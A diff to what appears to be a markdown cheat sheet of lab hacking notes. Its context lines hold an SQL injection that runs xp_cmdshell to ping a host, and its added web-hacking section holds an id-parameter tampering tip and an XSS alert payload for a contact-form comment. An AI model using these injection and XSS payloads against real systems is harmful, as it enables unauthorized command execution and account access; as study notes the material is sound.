@@ -273,3 +273,17 @@ Execute cmd from login
 blah';exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; --
 ```
 </details>
+
+## Web Application Hacking
+<details>
+    <summary> Web Hacking</summary>
+    
+- ### 1) Parameter Tampering
+    - Changing ?id=1 or 2 or 3 to switch user.
+
+- ### 2) XSS
+      - In cotactact us page i the commrent section post the following script `<script>alert("You are Hacked")</script>`
+
+- ### 3) WPScan
+    - 
+</details>
